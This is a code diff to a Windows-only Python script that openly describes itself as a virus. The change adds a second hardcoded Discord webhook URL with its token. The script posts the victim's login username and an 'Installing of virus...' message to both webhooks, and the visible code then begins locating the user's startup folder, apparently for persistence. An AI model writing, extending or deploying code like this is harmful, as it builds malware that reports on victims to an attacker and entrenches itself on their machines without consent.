@@ -5,14 +5,15 @@ if sys.platform != "win32":
     print("This is ment for windows only. \nExiting...")
     exit(1)
 
-def log_to_discord(msg:str):
+def log_to_discord(msg:str, important=False):
     data = {"username":f"User:{os.getlogin()}", "content":msg}
     try:
         requests.post("https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM", json = data)
+        if important:
+            requests.post("https://discord.com/api/webhooks/1434566903019606127/-a0uOC4OWuJx7qpPWbIAF7PdYSGHQKQqlFdu8lcvNBSq2N9KHUr-qjJgCjy9gl0w1BfT", json = data)
     except:
         print("Failed to send port request")
-
-log_to_discord("Installing of virus...")
+log_to_discord("Installing of virus...", important=True)
 
 home_dir = os.path.expanduser("~")
 startup_folder = os.path.join(
